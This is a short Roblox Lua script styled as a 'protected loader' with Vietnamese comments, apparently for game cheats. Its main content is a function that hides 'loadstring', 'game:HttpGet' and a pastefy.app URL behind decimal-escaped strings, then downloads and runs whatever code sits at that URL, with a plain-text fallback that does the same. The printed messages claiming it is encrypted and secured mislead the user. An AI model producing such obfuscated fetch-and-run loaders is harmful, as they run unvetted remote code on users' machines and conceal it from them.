-- [[ 🍎 ULTRA V12 PROTECTED LOADER - BY MINHXPSX 🍎 ]]
-- [[ DATE: 2026 | VERSION: 12.0.4 ]]

local _0x55 = "MINHXPSX_SECURE_BYPASS"
local _0x88 = {
    "\108\111\97\100\115\116\114\105\110\103", -- loadstring
    "\103\97\109\101\58\72\116\116\112\71\101\116", -- game:HttpGet
    "\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\97\110\70\69\101\72\115\52\47\114\97\119" -- Link Key (Đã mã hóa)
}

-- Hàm giải mã và thực thi ngầm
local function _0xINIT()
    local _0xEXEC = function(_0x1) return _0x88[_0x1] end
    local _0xSUCCESS, _0xERR = pcall(function()
        -- Tải script từ máy chủ bảo mật của MinhXPSX
        return loadstring(game:HttpGet(_0x88[3]))()
    end)
    
    if not _0xSUCCESS then
        -- Backup Loader nếu server chính bảo trì
        warn("Connecting to MinhXPSX Cloud...")
        task.wait(1)
        loadstring(game:HttpGet("https://pastefy.app/anFEeHs4/raw"))()
    end
end

-- Hiệu ứng màu mè khi khởi động cho VIP
local CoreGui = game:GetService("CoreGui")
local notify = Instance.new("ScreenGui", CoreGui)
local txt = Instance.new("TextLabel", notify)
txt.Size = UDim2.new(0, 300, 0, 50)
txt.Position = UDim2.new(0.5, -150, 0, 50)
txt.Text = "🍎 ULTRA V12 LOADING..."; txt.TextColor3 = Color3.new(1,1,1)
txt.BackgroundColor3 = Color3.new(0,0,0); Instance.new("UICorner", txt)
task.spawn(function()
    for i = 1, 30 do
        txt.TextColor3 = Color3.fromHSV(tick()%5/5, 0.8, 1)
        task.wait()
    end
    notify:Destroy()
end)

task.spawn(_0xINIT)

print("---------------------------------------")
print("🛡️ MINHXPSX V12 ENCRYPTED SUCCESSFULLY")
print("🍎 TRẠNG THÁI: ĐÃ BẢO MẬT")
print("---------------------------------------")
